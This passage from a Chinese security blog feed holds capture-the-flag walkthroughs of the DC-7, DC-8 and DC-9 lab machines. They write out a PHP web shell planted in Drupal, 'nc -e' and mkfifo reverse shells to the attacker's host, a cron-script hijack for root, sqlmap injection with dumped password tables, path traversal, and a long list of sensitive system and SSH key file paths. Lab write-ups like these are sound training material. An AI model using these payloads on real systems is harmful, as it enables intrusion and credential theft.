-<p>   当secure_file_priv的值为NULL或/tmp/时，此时无法提权<br>   当secure_file_priv的值没有具体值时，则可以提权</p>
-</li>
-</ul>
-<p>​    udf文件路径：</p>
-<ul>
-<li>sqlmap：sqlmap根目录/data/udf/mysql</li>
-<li>msf：MSF根目录/embedded/framework/data/exploits/mysql</li>
-<li>网页16进制：国光大佬写的<a class="link" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html<i class="fas fa-external-link-alt"></i></a></li>
-</ul>
-<h2 id="9-wireshark过滤规则"><a href="#9-wireshark过滤规则" class="headerlink" title="9. wireshark过滤规则"></a>9. wireshark过滤规则</h2><h3 id="IP："><a href="#IP：" class="headerlink" title="IP："></a>IP：</h3><p>源、目的IP为xxx<br>ip.addr == 172.16.0.0/16<br>ip.src==172.16.0.0/16<br>ip.dst==192.168.0.0/16</p>
-<h3 id="端口："><a href="#端口：" class="headerlink" title="端口："></a>端口：</h3><p>方法一样，但是需要区别TCP和UDP<br>TCP.port==80<br>UDP.port==3702<br>TCP.srcport == 80<br>tcp.dstport == 80<br>……</p>
-<h3 id="协议："><a href="#协议：" class="headerlink" title="协议："></a>协议：</h3><p>协议直接输就行了<br>tcp<br>icmp<br>dns<br>snmp<br>……</p>
-<h2 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10. 宽字节注入"></a>10. 宽字节注入</h2><p>留坑</p>
-<h2 id="11-RSA加密过程"><a href="#11-RSA加密过程" class="headerlink" title="11. RSA加密过程"></a>11. RSA加密过程</h2><p>留坑</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>DC-7</title>
-    <url>/2021/06/15/DC-7/</url>
-    <content><![CDATA[<p>运行虚拟机，有ip<br>192.168.101.136<br>就跳过找ip的步骤</p>
-<p>端口，少的可怜，不过开了22</p>
-<p><img src="image-20210615195315898.png" alt="image-20210615195315898"></p>
-<p>目录没有什么特别的发现，有一个robots.txt</p>
-<p><a class="link" href="http://192.168.101.136/robots.txt">http://192.168.101.136/robots.txt<i class="fas fa-external-link-alt"></i></a></p>
-<h2 id="github找到敏感信息"><a href="#github找到敏感信息" class="headerlink" title="github找到敏感信息"></a>github找到敏感信息</h2><p>去谷歌搜了一下@DC7USER<br>DC7user<br>然后找到了这个<br><a class="link" href="https://github.com/Dc7User/staffdb">https://github.com/Dc7User/staffdb<i class="fas fa-external-link-alt"></i></a><br>下载过来看一下</p>
-<p>在config.php里找到这个<br>dc7user<br>MdR3xOgB7#dW</p>
-<p><img src="image-20210615200413283.png" alt="image-20210615200413283"></p>
-<p>但是我只扫到22和80端口，所以用这个账号密码去试着连接一下ssh<br>还真成了</p>
-<p><img src="image-20210615200601267.png" alt="image-20210615200601267"></p>
-<p>sudo -l<br>find / -perm -u=s -type f 2&gt;/dev/null<br>都没有东西</p>
-<p><img src="image-20210615200926046.png" alt="image-20210615200926046"></p>
-<p>在/home/dc7user目录下，有个backup文件夹和mbox文件，看了一下mbox，应该是邮件文件</p>
-<p><img src="image-20210615201036925.png" alt="image-20210615201036925"></p>
-<p>像是日志，里面分析出来的有用的信息有，<br> /opt/scripts/backups.sh<br> /home/dc7user/backups/website.sql</p>
-<p><img src="image-20210615202334847.png" alt="image-20210615202334847"></p>
-<p><img src="image-20210615202358421.png" alt="image-20210615202358421"></p>
-<p>sh文件先放一边，gpg是一种加密文件，去百度了，看不懂，<br>回到sh文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;*</span><br><span class="line">cd &#x2F;var&#x2F;www&#x2F;html&#x2F;</span><br><span class="line">drush sql-dump --result-file&#x3D;&#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">cd ..</span><br><span class="line">tar -czf &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz html&#x2F;</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">gpg --pinentry-mode loopback --passphrase PickYourOwnPassword --symmetric &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz</span><br><span class="line">chown dc7user:dc7user &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;*</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.sql</span><br><span class="line">rm &#x2F;home&#x2F;dc7user&#x2F;backups&#x2F;website.tar.gz</span><br></pre></td></tr></table></figure>
-<p>在我一步一步跟着shell文件走时，突然来了个这个</p>
-<p><img src="image-20210615210208038.png" alt="image-20210615210208038"></p>
-<p>没啥用，再来一次，这次得到了未加密的文件</p>
-<p><img src="image-20210615210849864.png" alt="image-20210615210849864"></p>
-<p>用xshell连上，再用xftp把文件下载到本地</p>
-<p>可以看到用的是mariadb，其他的我什么都没找到</p>
-<p><img src="image-20210615212026712.png" alt="image-20210615212026712"></p>
-<p>这边倒是有东西</p>
-<p><img src="image-20210615212041261.png" alt="image-20210615212041261"></p>
-<p>既然有这么些漏洞，我就去google搜一下<br><del>没找到可以利用的！！</del></p>
-<h2 id="连接上数据库"><a href="#连接上数据库" class="headerlink" title="连接上数据库"></a>连接上数据库</h2><p>看了一样别人的博客，在/var/www/html/sites/default下的setting.php文件里找到了东西<br>数据库的账户<br>db7user<br>yNv3Po00</p>
-<p><img src="image-20210615213202755.png" alt="image-20210615213202755"></p>
-<p>在 select * from d7db.users_field_data里找到了admin账号和密码<br>但是解密不出来，卡了一天，参考了一下别人的，可以用drush来修改密码<br>    drush user-password admin –password=”12345”<br>然后回到网站<br><a class="link" href="http://192.168.101.136/user/login">http://192.168.101.136/user/login<i class="fas fa-external-link-alt"></i></a><br>用admin<br>12345<br>登录网站</p>
-<h2 id="反弹www-data的shell，修改backups文件"><a href="#反弹www-data的shell，修改backups文件" class="headerlink" title="反弹www-data的shell，修改backups文件"></a>反弹www-data的shell，修改backups文件</h2><p>使用drupal的反弹shell，添加插件<br><a class="link" href="http://drupal.org/project/php">http://drupal.org/project/php<i class="fas fa-external-link-alt"></i></a><br>在extend-&gt; install new module-&gt;添加下载的php插件<br>然后在extend里找到他，勾选，启用</p>
-<p><img src="image-20210617111425619.png" alt="image-20210617111425619"></p>
-<p>之后在content-&gt; add  content -&gt; basic page    里写入<br>    <?php system($_GET['a'])?><br>注意修改text format为phpcode,保存，预览，在url后面加上<br>    ?a=nc -e /bin/bash 192.168.243.131 4446<br>来反弹shell。拿到www-data的权限后，</p>
-<p><img src="image-20210617112439966.png" alt="image-20210617112439966"></p>
-<p>然后修改backups.sh文件，<br>    echo “rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.243.131 4445 &gt;/tmp/f “&gt;backups.sh<br>用它的定时任务，反弹一个root权限的shell回来<br>要点耐心，需要等一会，</p>
-<p><img src="image-20210617121256110.png" alt="image-20210617121256110"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一篇记录得有些乱，这个靶机看来作者是想让我们从github来找敏感信息，找到后使用ssh连上后，后面的操作我确实想不到，从网页设置文件中找到了数据库密码，连上数据库后修改admin用户的密码，再在网页中使用admin用户反弹更高权限的shell，然后就是和上一个靶机类似操作的，修改shell文件，利用定时任务来提权</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>DC-8</title>
-    <url>/2021/06/17/DC-8/</url>
-    <content><![CDATA[<p>IP确认：192.168.243.134</p>
-<h2 id="注入拿后台账户"><a href="#注入拿后台账户" class="headerlink" title="注入拿后台账户"></a>注入拿后台账户</h2><p>打开网页的时候看到<a class="link" href="http://192.168.243.134/?nid=1">http://192.168.243.134/?nid=1<i class="fas fa-external-link-alt"></i></a> 有个id<br>在searchsploit查的时候看到好几个注入</p>
-<p><img src="image-20210617132751781.png" alt="image-20210617132751781"></p>
-<p>就直接丢sqlmap跑了<br>一步一步查过去，<br>有两个库<br>d7db,information_schema<br>d7db下面有给users表，里面有admin和john两个用户的信息</p>
-<pre><code>+---------+---------------------------------------------------------+
-| name    | pass                                                    |
-+---------+---------------------------------------------------------+
-| &lt;blank&gt; | &lt;blank&gt;                                                 |
-| admin   | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |
-| john    | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |
-+---------+---------------------------------------------------------+
-</code></pre>
-<p><img src="image-20210617133348566.png" alt="image-20210617133348566"></p>
-<p>登录入口虽然在页面不见了，但还是在的<br>192.168.243.134/user</p>
-<p>把密码用john解密</p>
-<p><img src="image-20210617150600575.png" alt="image-20210617150600575"></p>
-<p>密码解密出来一个turtle<br>测试是john的密码<br>    john<br>    turtle</p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>登录进去后，在contact us的编辑那里找到了可以反弹shell的地方，但是我自己用的时候，把</p><p>flag</p>给删掉了，结果就用不了，后面看了别人的才成功<br>先编写好要执行的命令，我这边是直接反弹shell<br>所以写的是<p></p>
-<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;p&gt;flag&lt;/p&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> system(<span class="string">&#x27;nc -e /bin/bash 192.168.243.130 4444&#x27;</span>)<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-<p><img src="image-20210617161947709.png" alt="image-20210617161947709"></p>
-<p>保存后，去contact us随便提交一点什么东西</p>
-<p><img src="image-20210617162115369.png" alt="image-20210617162115369"><br>kali这边就接收到了shell了</p>
-<p><img src="image-20210617162143755.png" alt="image-20210617162143755"></p>
-<p>用  python -c ‘import pty; pty.spawn(“/bin/bash”)’<br>获取一个完全交互的shell</p>
-<p>然后又是翻箱倒柜的找有用的信息<br>依然是在/var/www/html/sites/default/settings.php里找到了数据库密码</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dbuser</span><br><span class="line">4nB90JumP</span><br></pre></td></tr></table></figure>
-<p><img src="image-20210617162411546.png" alt="image-20210617162411546"></p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>连进去找了一会才想起来,我就是用的注入进来的.<br>在继续翻箱倒柜找<br>sudo -l需要www-data的密码<br>find / * -perm -u=s -type f 2&gt;/dev/null的结果如下</p>
-<p><img src="image-20210617171914113.png" alt="image-20210617171914113"></p>
-<p>在看passwd文件的时候,发现有这个用户Debian-exim</p>
-<p><img src="image-20210617172107085.png" alt="image-20210617172107085"></p>
-<p>结合上面用find找到的exim4,这里应该有问题,</p>
-<p>百度查了一下:<a class="link" href="https://blog.csdn.net/qq_34965596/article/details/104658544">https://blog.csdn.net/qq_34965596/article/details/104658544<i class="fas fa-external-link-alt"></i></a></p>
-<p>然后就成了</p>
-<p><img src="image-20210617172931950.png" alt="image-20210617172931950"></p>
-<p><img src="image-20210617173526965.png" alt="image-20210617173526965"></p>
-<p>值得一提的是,这个shell很不稳定</p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>注入使用的sqlmap,找到密码很快,但是解密却花了一些时间,没有想到用john来处理,把密文丢进去,直接john pass.txt解密就好了<br>第二个地方是在后台getshell的地方,这个我也是找到了地方,但是我把</p><p>flag</p>给删了,导致后续反弹不出来,也挺蛋疼的,<p></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>DC-9</title>
-    <url>/2021/06/17/DC-9/</url>
-    <content><![CDATA[<p>确定IP:192.168.243.135<br>端口:经典22,80<br>目录扫描<img src="image-20210617210023669.png" alt="image-20210617210023669"></p>
-<h2 id="注入拿敏感数据"><a href="#注入拿敏感数据" class="headerlink" title="注入拿敏感数据"></a>注入拿敏感数据</h2><p><a class="link" href="http://192.168.243.135/results.php">http://192.168.243.135/results.php<i class="fas fa-external-link-alt"></i></a> 搜索页面,payload为’or 1=1 ##时<br><img src="image-20210617180528043.png" alt="image-20210617180528043"><br>显示出了所以信息,确定是有注入了,丢sqlmap跑一下，找到了结果<br>有三个库users，Staff，information_schema<br>users下有一个表UserDetails ，Staff下有两个Users  ，StaffDetails ，<br>UserDetails表里的数据<br>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[17 entries]</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| username  | password      |</span><br><span class="line">+-----------+---------------+</span><br><span class="line">| marym     | 3kfs86sfd     |</span><br><span class="line">| julied    | 468sfdfsd2    |</span><br><span class="line">| fredf     | 4sfd87sfd1    |</span><br><span class="line">| barneyr   | RocksOff      |</span><br><span class="line">| tomc      | TC&amp;TheBoyz    |</span><br><span class="line">| jerrym    | B8m#48sd      |</span><br><span class="line">| wilmaf    | Pebbles       |</span><br><span class="line">| bettyr    | BamBam01      |</span><br><span class="line">| chandlerb | UrAG0D!       |</span><br><span class="line">| joeyt     | Passw0rd      |</span><br><span class="line">| rachelg   | yN72#dsd      |</span><br><span class="line">| rossg     | ILoveRachel   |</span><br><span class="line">| monicag   | 3248dsds7s    |</span><br><span class="line">| phoebeb   | smellycats    |</span><br><span class="line">| scoots    | YR3BVxxxw87   |</span><br><span class="line">| janitor   | Ilovepeepee   |</span><br><span class="line">| janitor2  | Hawaii-Five-0 |</span><br><span class="line">+-----------+---------------+</span><br></pre></td></tr></table></figure></p>
-<p>Users表里的数据<br>    <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">+----------------------------------+----------+</span><br><span class="line">| Password                         | username |</span><br><span class="line">+----------------------------------+----------+</span><br><span class="line">| 856f5de590ef37314e7c3bdf6f8a66dc | admin    |</span><br><span class="line">+----------------------------------+----------+</span><br></pre></td></tr></table></figure><br>StaffDetails表下只有用户信息，没有密码之类的，就没有dump了</p>
-<p>admin的那条密码在somd5.com解码出来了<br>admin<br>transorbital1</p>
-<h2 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h2><p>后台有一个插入数据的功能，应该是要用这个来getshell，<br>试了一些办法，没成功<br>后面看别人的，还是dc-5那个文件包含<br>拿bp爆破一下参数</p>
-<p><img src="image-20210618095436533.png" alt="image-20210618095436533"></p>
-<p><a class="link" href="http://192.168.243.135/manage.php?file=../../../../../../etc/passwd">http://192.168.243.135/manage.php?file=../../../../../../etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
-<p>可以看到用户挺多的，然后开了22端口，不知道爆破能不能爆出来<br>处理一下数据，准备ssh爆破</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">marym</span><br><span class="line">julied</span><br><span class="line">fredf</span><br><span class="line">barneyr</span><br><span class="line">tomc</span><br><span class="line">jerrym</span><br><span class="line">wilmaf</span><br><span class="line">bettyr</span><br><span class="line">chandlerb</span><br><span class="line">joeyt</span><br><span class="line">rachelg</span><br><span class="line">rossg</span><br><span class="line">monicag</span><br><span class="line">phoebeb</span><br><span class="line">scoots</span><br><span class="line">janitor</span><br><span class="line">janitor2</span><br></pre></td></tr></table></figure>
-<p>ssh连接不上，还是准备和dc-5一样的日志getshell吧<br>测了一下，日志读不到，裂开<br>决定爆破一下敏感文件</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;apache&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;apache&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;apache&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;bin&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;anacrontab</span><br><span class="line">&#x2F;etc&#x2F;apache&#x2F;apache.conf</span><br><span class="line">&#x2F;etc&#x2F;apache&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;apache.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;default</span><br><span class="line">&#x2F;etc&#x2F;apache2&#x2F;vhosts.d&#x2F;00_default_vhost.conf</span><br><span class="line">&#x2F;etc&#x2F;at.allow</span><br><span class="line">&#x2F;etc&#x2F;at.deny</span><br><span class="line">&#x2F;etc&#x2F;cron.allow</span><br><span class="line">&#x2F;etc&#x2F;cron.deny</span><br><span class="line">&#x2F;etc&#x2F;crontab</span><br><span class="line">&#x2F;etc&#x2F;fstab</span><br><span class="line">&#x2F;etc&#x2F;host.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf.d&#x2F;php.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;etc&#x2F;httpd&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;httpd</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;mysql</span><br><span class="line">&#x2F;etc&#x2F;ld.so.conf</span><br><span class="line">&#x2F;etc&#x2F;motd</span><br><span class="line">&#x2F;etc&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;etc&#x2F;network&#x2F;interfaces</span><br><span class="line">&#x2F;etc&#x2F;networks</span><br><span class="line">&#x2F;etc&#x2F;passwd</span><br><span class="line">&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4.4&#x2F;fcgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php4&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;apache2&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;php5&#x2F;cgi&#x2F;php.ini</span><br><span class="line">&#x2F;etc&#x2F;phpmyadmin&#x2F;config.inc.php</span><br><span class="line">&#x2F;etc&#x2F;resolv.conf</span><br><span class="line">&#x2F;etc&#x2F;shadow</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;sshd_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_config</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_dsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;ssh&#x2F;ssh_host_rsa_key.pub</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;network</span><br><span class="line">&#x2F;etc&#x2F;sysconfig&#x2F;network</span><br><span class="line">&#x2F;home&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;home&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;home&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;home2&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;NetServer&#x2F;bin&#x2F;stable&#x2F;apache&#x2F;php.ini</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;opt&#x2F;www&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;opt&#x2F;xampp&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;PHP&#x2F;php.ini</span><br><span class="line">&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;php5&#x2F;php.ini</span><br><span class="line">&#x2F;root&#x2F;.atftp_history</span><br><span class="line">&#x2F;root&#x2F;.bashrc</span><br><span class="line">&#x2F;root&#x2F;.bash_history</span><br><span class="line">&#x2F;root&#x2F;.mysql_history</span><br><span class="line">&#x2F;root&#x2F;.nano_history</span><br><span class="line">&#x2F;root&#x2F;.php_history</span><br><span class="line">&#x2F;root&#x2F;.profile</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;identity</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;identity.pub</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_dsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_dsa.pub</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa</span><br><span class="line">&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub</span><br><span class="line">&#x2F;root&#x2F;anaconda-ks.cfg</span><br><span class="line">&#x2F;tmp&#x2F;apache&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;tmp&#x2F;apache&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access.log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;access_logaccess_log.old</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error.log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache&#x2F;logs&#x2F;error_logerror_log.old</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;access_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;error_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;license_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;login_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;stats_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;cpanel&#x2F;logs&#x2F;stats_log</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd2.2&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;httpd2.2&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin&#x2F;mysql</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;lib&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;php5&#x2F;php5.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;share&#x2F;examples&#x2F;php&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;share&#x2F;examples&#x2F;php4&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;tomcat5527&#x2F;bin&#x2F;version.sh</span><br><span class="line">&#x2F;usr&#x2F;local&#x2F;Zend&#x2F;etc&#x2F;php.ini</span><br><span class="line">&#x2F;usr&#x2F;share&#x2F;tomcat6&#x2F;bin&#x2F;startup.sh</span><br><span class="line">&#x2F;usr&#x2F;tomcat6&#x2F;bin&#x2F;startup.sh</span><br><span class="line">&#x2F;var&#x2F;apache2&#x2F;config.inc</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;htdocs&#x2F;index.html</span><br><span class="line">&#x2F;var&#x2F;httpd&#x2F;htdocs&#x2F;index.php</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;my.cnf</span><br><span class="line">&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql&#x2F;user.MYD</span><br><span class="line">&#x2F;var&#x2F;local&#x2F;www&#x2F;conf&#x2F;httpd.conf</span><br><span class="line">&#x2F;var&#x2F;local&#x2F;www&#x2F;conf&#x2F;php.ini</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;error.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;error_log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql-bin.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql-slow.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysql&#x2F;mysql.log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mysqlderror.log</span><br><span 